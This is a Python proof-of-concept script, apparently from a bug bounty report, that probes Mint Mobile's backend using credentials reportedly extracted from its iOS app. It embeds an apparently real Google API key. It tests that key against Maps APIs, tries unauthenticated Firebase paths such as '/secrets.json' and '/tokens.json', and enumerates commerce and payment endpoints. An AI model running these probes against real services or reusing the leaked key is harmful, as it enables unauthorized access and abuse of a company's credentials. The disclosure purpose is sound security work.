#!/usr/bin/env python3
"""
Mint Mobile API Hardcoded Secrets - Proof of Concept
Demonstrates unauthorized API access using hardcoded credentials

Target: Mint Mobile iOS App (com.uvnv.mintsim v2.3.38)
Severity: HIGH - Hardcoded API credentials allow unauthorized access
Bug Bounty: Ultra Mobile Mobile Apps Program

Author: FlutterSentinel
Date: 2026-01-22
"""

import requests
import json
from typing import Dict, Any, Optional
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class MintMobileAPIPoc:
    """
    Proof of Concept for Mint Mobile hardcoded API credentials
    """
    
    def __init__(self):
        # Hardcoded API endpoints discovered in binary
        self.endpoints = {
            'commerce': 'https://commerce-api.ultramobile.com',
            'commerce_v1': 'https://commerce-api.ultramobile.com/v1/mint',
            'smartystreets': 'https://us-street.api.smartystreets.com',
            'sprig': 'https://api.sprig.com',
            'braintree_prod': 'https://payments.braintree-api.com',
            'braintree_sandbox': 'https://payments.sandbox.braintree-api.com',
            'braintree_cosmos': 'https://api.cosmos.braintreepayments.com'
        }
        
        # Google API Key found in binary
        self.google_api_key = "AIzaSyAANh4HS0IRZMpxGqFDgKOMwMY6OD4W0W4"
        
        # Firebase database URL
        self.firebase_url = "https://mint-sim-app.firebaseio.com"
        
        self.results = {}
    
    def test_commerce_api(self) -> Dict[str, Any]:
        """Test Mint Mobile Commerce API"""
        console.print("\n[cyan]🔍 Testing Commerce API...[/cyan]")
        
        results = {
            'endpoint': self.endpoints['commerce'],
            'accessible': False,
            'data_exposed': False,
            'findings': []
        }
        
        # Test common endpoints
        test_paths = [
            '/v1/mint/products',
            '/v1/mint/plans',
            '/v1/mint/users',
            '/v1/mint/orders',
            '/api/products',
            '/api/plans',
            '/health',
            '/status'
        ]
        
        for path in test_paths:
            url = f"{self.endpoints['commerce']}{path}"
            try:
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    results['accessible'] = True
                    results['findings'].append({
                        'path': path,
                        'status': response.status_code,
                        'data': response.text[:200]
                    })
                    console.print(f"  [green]✓ {path}: {response.status_code}[/green]")
                elif response.status_code in [401, 403]:
                    console.print(f"  [yellow]⚠ {path}: {response.status_code} (Auth required)[/yellow]")
                else:
                    console.print(f"  [dim]  {path}: {response.status_code}[/dim]")
                    
            except Exception as e:
                console.print(f"  [dim]  {path}: Error - {str(e)[:50]}[/dim]")
        
        return results
    
    def test_google_api_key(self) -> Dict[str, Any]:
        """Test Google API Key validity"""
        console.print("\n[cyan]🔍 Testing Google API Key...[/cyan]")
        
        results = {
            'key': f"{self.google_api_key[:20]}...",
            'valid': False,
            'accessible_apis': []
        }
        
        # Test various Google APIs
        google_apis = {
            'Geocoding': f'https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway,+Mountain+View,+CA&key={self.google_api_key}',
            'Places': f'https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-33.8670,151.1957&radius=500&types=food&key={self.google_api_key}',
            'Directions': f'https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood&key={self.google_api_key}',
            'Static Maps': f'https://maps.googleapis.com/maps/api/staticmap?center=Brooklyn+Bridge,New+York,NY&zoom=13&size=600x300&key={self.google_api_key}',
        }
        
        for api_name, url in google_apis.items():
            try:
                response = requests.get(url, timeout=5)
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                
                if response.status_code == 200 and data.get('status') != 'REQUEST_DENIED':
                    results['valid'] = True
                    results['accessible_apis'].append(api_name)
                    console.print(f"  [green]✓ {api_name}: Accessible[/green]")
                else:
                    console.print(f"  [yellow]⚠ {api_name}: {data.get('status', 'Denied')}[/yellow]")
                    
            except Exception as e:
                console.print(f"  [dim]  {api_name}: Error - {str(e)[:50]}[/dim]")
        
        return results
    
    def test_firebase_database(self) -> Dict[str, Any]:
        """Test Firebase Realtime Database access"""
        console.print("\n[cyan]🔍 Testing Firebase Database...[/cyan]")
        
        results = {
            'url': self.firebase_url,
            'accessible': False,
            'exposed_data': []
        }
        
        # Test common Firebase paths
        test_paths = [
            '.json',
            '/users.json',
            '/config.json',
            '/data.json',
            '/secrets.json',
            '/api_keys.json',
            '/tokens.json'
        ]
        
        for path in test_paths:
            url = f"{self.firebase_url}{path}"
            try:
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and data != "null":
                            results['accessible'] = True
                            results['exposed_data'].append({
                                'path': path,
                                'data_preview': str(data)[:100]
                            })
                            console.print(f"  [red]✗ {path}: EXPOSED DATA![/red]")
                    except:
                        pass
                elif response.status_code == 401:
                    console.print(f"  [green]✓ {path}: Protected (401)[/green]")
                elif response.status_code == 403:
                    console.print(f"  [green]✓ {path}: Protected (403)[/green]")
                else:
                    console.print(f"  [dim]  {path}: {response.status_code}[/dim]")
                    
            except Exception as e:
                console.print(f"  [dim]  {path}: Error - {str(e)[:50]}[/dim]")
        
        return results
    
    def test_braintree_api(self) -> Dict[str, Any]:
        """Test Braintree Payment API endpoints"""
        console.print("\n[cyan]🔍 Testing Braintree Payment APIs...[/cyan]")
        
        results = {
            'endpoints_found': len([e for e in self.endpoints.keys() if 'braintree' in e]),
            'accessible': False,
            'findings': []
        }
        
        # Test Braintree endpoints
        braintree_tests = {
            'Production': self.endpoints['braintree_prod'],
            'Sandbox': self.endpoints['braintree_sandbox'],
            'Cosmos': self.endpoints['braintree_cosmos']
        }
        
        for name, base_url in braintree_tests.items():
            try:
                response = requests.get(base_url, timeout=5)
                
                results['findings'].append({
                    'endpoint': name,
                    'url': base_url,
                    'status': response.status_code,
                    'accessible': response.status_code != 404
                })
                
                if response.status_code in [200, 401, 403]:
                    results['accessible'] = True
                    console.print(f"  [yellow]⚠ {name}: {response.status_code} (Endpoint exists)[/yellow]")
                else:
                    console.print(f"  [dim]  {name}: {response.status_code}[/dim]")
                    
            except Exception as e:
                console.print(f"  [dim]  {name}: Error - {str(e)[:50]}[/dim]")
        
        return results
    
    def test_smartystreets_api(self) -> Dict[str, Any]:
        """Test SmartyStreets API"""
        console.print("\n[cyan]🔍 Testing SmartyStreets API...[/cyan]")
        
        results = {
            'endpoint': self.endpoints['smartystreets'],
            'accessible': False,
            'requires_auth': True
        }
        
        try:
            # Test basic endpoint
            response = requests.get(self.endpoints['smartystreets'], timeout=5)
            
            results['status_code'] = response.status_code
            
            if response.status_code in [200, 401, 403]:
                results['accessible'] = True
                console.print(f"  [yellow]⚠ Endpoint exists: {response.status_code}[/yellow]")
            else:
                console.print(f"  [dim]  Status: {response.status_code}[/dim]")
                
        except Exception as e:
            console.print(f"  [dim]  Error: {str(e)[:50]}[/dim]")
        
        return results
    
    def generate_report(self):
        """Generate comprehensive PoC report"""
        console.print("\n" + "="*70)
        console.print("[bold cyan]📊 Mint Mobile API Security Assessment - PoC Results[/bold cyan]")
        console.print("="*70 + "\n")
        
        # Summary table
        table = Table(title="Findings Summary", show_header=True, header_style="bold cyan")
        table.add_column("Test", style="cyan")
        table.add_column("Result", style="yellow")
        table.add_column("Severity", style="red")
        
        for test_name, result in self.results.items():
            if isinstance(result, dict):
                if result.get('accessible') or result.get('valid'):
                    severity = "🔴 HIGH"
                    status = "✗ VULNERABLE"
                else:
                    severity = "🟢 LOW"
                    status = "✓ Protected"
                
                table.add_row(test_name, status, severity)
        
        console.print(table)
        
        # Detailed findings
        console.print("\n[bold]📋 Detailed Findings:[/bold]\n")
        
        for test_name, result in self.results.items():
            console.print(f"[cyan]▶ {test_name}[/cyan]")
            console.print(f"  {json.dumps(result, indent=2)}\n")
    
    def run_all_tests(self):
        """Execute all PoC tests"""
        console.print(Panel.fit(
            "[bold cyan]Mint Mobile API Security PoC[/bold cyan]\n"
            "Testing hardcoded credentials and API endpoints",
            border_style="cyan"
        ))
        
        # Run all tests
        self.results['commerce_api'] = self.test_commerce_api()
        self.results['google_api_key'] = self.test_google_api_key()
        self.results['firebase_database'] = self.test_firebase_database()
        self.results['braintree_api'] = self.test_braintree_api()
        self.results['smartystreets_api'] = self.test_smartystreets_api()
        
        # Generate report
        self.generate_report()
        
        # Save results
        output_file = "mint_mobile_poc_results.json"
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        console.print(f"\n[green]✓ Results saved to: {output_file}[/green]")
        
        return self.results


def main():
    """Main PoC execution"""
    console.print("\n[bold red]⚠️  WARNING: This PoC is for authorized security testing only![/bold red]")
    console.print("[yellow]Only run against targets you have permission to test.[/yellow]\n")
    
    # Confirm execution
    response = input("Continue with PoC? (yes/no): ")
    if response.lower() != 'yes':
        console.print("[yellow]PoC cancelled.[/yellow]")
        return
    
    # Run PoC
    poc = MintMobileAPIPoc()
    results = poc.run_all_tests()
    
    # Impact summary
    console.print("\n" + "="*70)
    console.print("[bold red]💥 IMPACT ASSESSMENT[/bold red]")
    console.print("="*70)
    console.print("""
[yellow]Hardcoded API credentials in mobile applications allow:[/yellow]

1. 🔓 Unauthorized API access using extracted credentials
2. 💳 Potential payment system reconnaissance
3. 📊 Data exfiltration if APIs are not properly secured
4. 🎯 Targeted attacks against backend infrastructure
5. 💰 Potential financial impact if payment APIs are accessible

[bold red]RECOMMENDATION:[/bold red]
- Remove all hardcoded API keys from binary
- Implement proper API authentication (OAuth, JWT)
- Use certificate pinning for sensitive APIs
- Rotate all exposed credentials immediately
- Implement rate limiting and monitoring
""")


if __name__ == "__main__":
    main()
